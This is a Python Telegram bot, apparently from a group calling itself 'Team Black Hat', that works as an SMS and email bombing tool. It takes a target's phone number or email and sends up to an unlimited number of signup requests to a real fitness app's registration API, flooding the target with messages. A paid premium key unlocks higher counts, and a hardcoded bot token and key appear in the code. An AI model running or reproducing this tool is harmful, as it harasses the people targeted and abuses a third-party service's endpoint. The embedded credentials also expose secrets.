
import logging
import aiohttp
import asyncio
import time
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)

BOT_TOKEN = "8031585414:AAENT7gEkiX7GvzFTbL8dGEhhYCECRiGZxM"
REQUIRED_CHANNEL = "@team_black_hat_offical"
PREMIUM_KEY = "786LEGNEDOLDHACKER"

logging.basicConfig(level=logging.INFO)
user_states = {}  # user_id: {state, data}
premium_users = set()
cooldown_users = {}  # user_id: cooldown_end_time

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states.pop(user_id, None)
    keyboard = [
        [InlineKeyboardButton("🚀 JOIN CHANNEL", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}")],
        [InlineKeyboardButton("✅ JOINED", callback_data="joined")]
    ]
    await update.message.reply_text(
        "🔐 YOU NEED TO JOIN TEAM BLACK HAT OFFICIAL TO USE THIS BOT",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def check_joined(user_id, context):
    member = await context.bot.get_chat_member(REQUIRED_CHANNEL, user_id)
    return member.status in ['member', 'administrator', 'creator']

async def joined_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if await check_joined(user_id, context):
        keyboard = [
            [InlineKeyboardButton("📞 PHONE NUMBER", callback_data="reg_phone")],
            [InlineKeyboardButton("✉️ EMAIL", callback_data="reg_email")]
        ]
        await query.edit_message_text(
            "✅ You're verified!\n\n👉 CHOOSE YOUR REGISTRATION METHOD:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    else:
        await query.edit_message_text("❌ You must join the channel first!")

async def registration_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == "reg_phone":
        user_states[user_id] = {"state": "awaiting_phone"}
        await query.edit_message_text("📱 Send your phone number (e.g., `923001234567`):", parse_mode="Markdown")
    elif query.data == "reg_email":
        user_states[user_id] = {"state": "awaiting_email"}
        await query.edit_message_text("✉️ Send your email address:")

async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    session = user_states.get(user_id)

    if not session:
        await update.message.reply_text("❗ Use /start to begin.")
        return

    state = session["state"]

    if state == "awaiting_phone":
        user_states[user_id] = {"state": "awaiting_count", "method": "phone", "value": text}
        await update.message.reply_text("💥 ENTER HOW MANY TIMES TO REGISTER:")

    elif state == "awaiting_email":
        user_states[user_id] = {"state": "awaiting_count", "method": "email", "value": text}
        await update.message.reply_text("💥 ENTER HOW MANY TIMES TO REGISTER:")

    elif state == "awaiting_count":
        if not text.isdigit():
            await update.message.reply_text("❌ Please enter a valid number.")
            return

        count = int(text)
        method = session["method"]
        value = session["value"]

        now = time.time()
        cooldown_end = cooldown_users.get(user_id, 0)

        if now < cooldown_end and user_id not in premium_users:
            remaining = int(cooldown_end - now)
            msg = await update.message.reply_text("⏳ Cooldown active. Please wait...")
            for i in range(remaining, 0, -30):
                percent = int((300 - i) / 300 * 100)
                bar = "▓" * (percent // 10) + "░" * (10 - percent // 10)
                await msg.edit_text(
                    f"⏳ Cooldown active...\n[{bar}] {percent}%\nTime left: {i//60}m {i%60}s"
                )
                await asyncio.sleep(30)
            await msg.edit_text("✅ Cooldown finished. Please send the number again.")
            user_states[user_id] = {
                "state": "awaiting_count",
                "method": method,
                "value": value
            }
            return

        if count > 50 and user_id not in premium_users:
            keyboard = [
                [InlineKeyboardButton("🔐 BUY KEY", url="https://t.me/team_black_hat_offical")],
                [InlineKeyboardButton("✅ ENTER PREMIUM KEY", callback_data="enter_key")]
            ]
            user_states[user_id] = {"state": "awaiting_key", "method": method, "value": value, "requested": count}
            await update.message.reply_text(
                "🚫 NEED PREMIUM KEY FOR UNLIMITED REGISTER",
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return

        if count == 50 and user_id not in premium_users:
            cooldown_users[user_id] = time.time() + 300

        await send_registration(update, method=method, value=value, count=count)
        user_states.pop(user_id, None)

    elif state == "awaiting_key":
        if text == PREMIUM_KEY:
            premium_users.add(user_id)
            await update.message.reply_text("🔓 PREMIUM UNLOCKED! Send the number again to register.")
            user_states[user_id] = {
                "state": "awaiting_count",
                "method": session["method"],
                "value": session["value"]
            }
        else:
            await update.message.reply_text("❌ Invalid premium key.")
    else:
        await update.message.reply_text("❗ Use /start to begin.")

async def send_registration(update, method, value, count):
    msg = await update.message.reply_text(f"🚀 Sending {count} registration request(s)...")
    success = 0
    failed = 0
    async with aiohttp.ClientSession() as session:
        for i in range(count):
            try:
                payload = {
                    "type": "msisdn" if method == "phone" else "email",
                    "user_platform": "Android",
                    "country_id": "162",
                    "msisdn": value if method == "phone" else "",
                    "email": value if method == "email" else ""
                }
                async with session.post("https://prod.fitflexapp.com/api/users/signupV1", json=payload, timeout=10) as resp:
                    if resp.status == 200:
                        success += 1
                    else:
                        failed += 1
            except:
                failed += 1

            percent = int((i + 1) / count * 100)
            bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
            await msg.edit_text(
                f"📡 Progress: [{bar}] {percent}%\n\n✅ Success: {success}\n❌ Failed: {failed}"
            )
            await asyncio.sleep(3)
    await msg.edit_text(f"✅ Done!\n\n🟢 Success: {success}\n🔴 Failed: {failed}")

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(joined_callback, pattern="joined"))
    app.add_handler(CallbackQueryHandler(registration_choice, pattern="reg_.*"))
    app.add_handler(CallbackQueryHandler(lambda u, c: False, pattern="enter_key"))  # Prevent crashes
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))
    print("🤖 Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
